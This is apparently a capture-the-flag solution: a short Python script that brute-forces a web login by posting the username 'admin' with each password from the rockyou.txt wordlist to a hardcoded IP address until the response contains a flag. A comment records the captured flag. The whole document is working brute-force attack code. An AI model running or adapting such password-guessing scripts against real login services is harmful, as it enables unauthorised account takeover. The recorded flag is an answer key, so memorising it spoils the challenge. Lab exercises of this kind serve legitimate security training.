import requests

with open('/usr/share/wordlists/rockyou.txt', 'r') as f:
    for line in f:
        line = line.strip()
        data = {'username': 'admin', 'password': line}
        r = requests.post('http://35.198.79.69:31889/', data=data)
        if 'CTF{' in r.text:
            print(r.text)
            break
# CTF{aa4e966537c108ecd32d64096a6666ba96f15ec147a2aaec24d5ae26b7ad6e14}